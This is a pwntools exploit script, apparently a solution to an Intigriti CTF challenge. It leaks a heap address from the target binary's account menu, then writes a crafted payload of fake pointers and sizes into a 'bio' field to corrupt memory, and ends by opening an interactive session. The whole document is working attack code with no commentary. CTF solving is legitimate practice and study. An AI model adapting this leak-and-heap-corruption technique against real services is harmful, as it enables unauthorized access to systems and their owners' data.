from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./sexo")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendlineafter("menu> ", b"0")
io.sendlineafter("name>", b"diego")
io.sendlineafter("password>", b"password")
io.sendlineafter("bio>", b"1")

# Logout
io.sendlineafter("menu>", b"6")

io.sendlineafter("menu>", b"1")

io.recvuntil("is: ")

leak_user_address = int(hex(int.from_bytes(io.recv(5), byteorder='little')) + '2a0', 16)

print("[+]", hex(leak_user_address))

io.sendlineafter("menu>", b"0")
io.sendlineafter("name>", b"rocio")
io.sendlineafter("password>", b"hamburguesa")

payload = b"".join([
    p64(leak_user_address + 128),
    p64(0x41),
    p64(0x7d0),
    p64(0x41414141),
    p64(0x0),
    p64(0x0),
    p64(0x0),
    p64(0x41414141),
    p64(0x0), p64(0x0), p64(0x0), p64(0x0), p64(0x0), p64(0x0), p64(0x0), p64(0x0),
    p64(0x0), p64(0x0), p64(0x0), p64(0x0), p64(0x0), p64(0x0), p64(0x0),
    p64(leak_user_address + 432),
    p64(0x0), p64(0x0)

])

io.sendlineafter("bio>", b"200")
io.sendlineafter("bio>", payload)

io.sendlineafter("menu>", b"2")
io.sendlineafter("title>", b"mago")
io.sendlineafter("report>", b"mago")

io.interactive()
